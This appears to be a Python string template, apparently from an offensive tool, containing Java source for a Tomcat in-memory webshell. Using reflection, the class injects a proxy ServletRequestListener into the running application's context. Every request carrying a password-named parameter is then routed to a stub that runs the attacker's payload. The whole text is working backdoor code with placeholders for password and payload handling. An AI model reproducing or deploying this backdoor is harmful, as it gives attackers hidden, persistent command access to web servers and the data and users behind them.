code = """
import java.lang.reflect.*;
import java.util.*;

public class TomcatListener extends ClassLoader implements InvocationHandler {{
    private static String password = "{password}";
{common}
{decoder}
{stub}
{context}
    private void hook(Object servletRequestEvent) throws Exception {{
        Object servletRequest = invokeMethod(
            servletRequestEvent, "getServletRequest"
        );
        Object request = getFieldValue(servletRequest, "request");
        Object response = invokeMethod(request, "getResponse");
        String payload = (String) invokeMethod(
            servletRequest, "getParameter", password
        );
        stub(payload, request, response);
    }}

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {{
        if (method.getName().equals("requestInitialized")) {{
            Object servletRequestEvent = args[0];
            hook(servletRequestEvent);
        }}
        return null;
    }}

    private void addListener(Object proxyObject) throws Exception {{
        Object context = getStandardContext();
        for (Object listener :
            (Object[]) invokeMethod(context, "getApplicationEventListeners")
        ) {{
            if (listener instanceof Proxy) {{
                return;
            }}
        }}
        getMethodX(context.getClass(), "addApplicationEventListener", 1)
            .invoke(context, proxyObject);
    }}

    public TomcatListener() {{
        synchronized(lock) {{
            Class servletRequestListener = null;
            try {{
                servletRequestListener = Class.forName(
                    "javax.servlet.ServletRequestListener"
                );
            }} catch (ClassNotFoundException e) {{
                try {{
                    servletRequestListener = Class.forName(
                        "jakarta.servlet.ServletRequestListener"
                    );
                }} catch (ClassNotFoundException ex) {{}}
            }}

            if (servletRequestListener != null) {{
                Object proxyObject = Proxy.newProxyInstance(
                    getLoader(), new Class[]{{servletRequestListener}}, this
                );
                try {{
                    addListener(proxyObject);
                }} catch (Exception e) {{}}
            }}
        }}
    }}

    public TomcatListener(ClassLoader loader) {{
        super(loader);
    }}

    static {{
        new TomcatListener();
    }}
}}
"""